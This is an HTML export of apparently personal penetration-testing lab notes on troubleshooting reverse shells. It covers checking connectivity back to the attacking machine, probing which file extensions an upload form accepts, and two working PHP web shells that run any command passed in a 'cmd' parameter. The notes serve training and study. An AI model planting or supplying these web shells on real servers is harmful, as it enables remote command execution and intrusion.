<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Troubleshooting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Troubleshooting Shells</h1></strong><br />If you&#39;re having trouble getting a shell to call back, try breaking it down.<br /><br /><strong><h2>## Ping Yourself</h2></strong><br />First, check if you can ping yourself (your attacking machine) from the target machine.<br /><br />1. Use <code>tcpdump</code> to listen on your attacking machine for ICMP packets<br /><code>-i</code> = interface<br /><br /><code>tcpdump -i tun0 icmp</code><br /><br />2. Then ping your attacking machine from the target.<br /><code>ping &lt;attacking ip&gt;</code><br /><br />If the target can connect, you will see ping packets from the target on your tcpdump listener.<br /><br /><strong><h2>## Route to yourself</h2></strong><br />Similar to pinging yourself - see if you can access your attacking machine.<br /><code>ip route get 10.11.0.184</code><br /><br /><strong><h2>## Restricted Ports</h2></strong><br />Try a lower port, or a port that is listed as open on Nmap.<br />High ports are sometimes restricted.<br /><br /><strong><h2>## Web App? - Check file extension/file header/file content</h2></strong><br />If you&#39;re uploading a web shell, test what files you can upload.<br /><br />1. Create a <code>test.txt</code> with text inside it, and upload the file.<br /><code>echo “hey” &gt; test.txt</code><br /><br />2. Then rename the test.txt to web shell extensions to check what&#39;s allowed<br /><code>cp test.txt test.php</code><br /><code>cp test.txt test.asp</code><br /><code>cp test.txt test.aspx</code><br />etc.<br /><br />Also try modifying the file header and file content in burp.<br /><br /><strong><h2>## PHP Test</h2></strong><br />If you want to upload a PHP shell, the test that people often do first is create a PHP web shell.<br />And afterwards they move to getting an interactive shell.<br /><br />shell.php<br /><div class="codebox"><div class="codebox">&lt;?php<br />&nbsp;&nbsp;&nbsp;&nbsp;if($_GET[&#39;cmd&#39;])&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system($_GET[&#39;cmd&#39;]);&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<br />?&gt;</div></div><br /><br />And then run <code>http://vuln.com/shell.php?cmd=whoami</code> to run commands.<br />If this works, you should be able to get a fully interactive shell.<br /><br />More comprehensive one-liner here:<br /><a href="https://gist.github.com/sente/4dbb2b7bdda2647ba80b">https://gist.github.com/sente/4dbb2b7bdda2647ba80b</a><br /><div class="codebox"><div class="codebox">&lt;?php&nbsp;if(isset($_REQUEST[&#39;cmd&#39;])){&nbsp;echo&nbsp;&quot;&lt;pre&gt;&quot;;&nbsp;$cmd&nbsp;=&nbsp;($_REQUEST[&#39;cmd&#39;]);&nbsp;system($cmd);&nbsp;echo&nbsp;&quot;&lt;/pre&gt;&quot;;&nbsp;die;&nbsp;}?&gt;</div></div><br /><br /></div>
</body>
</html>
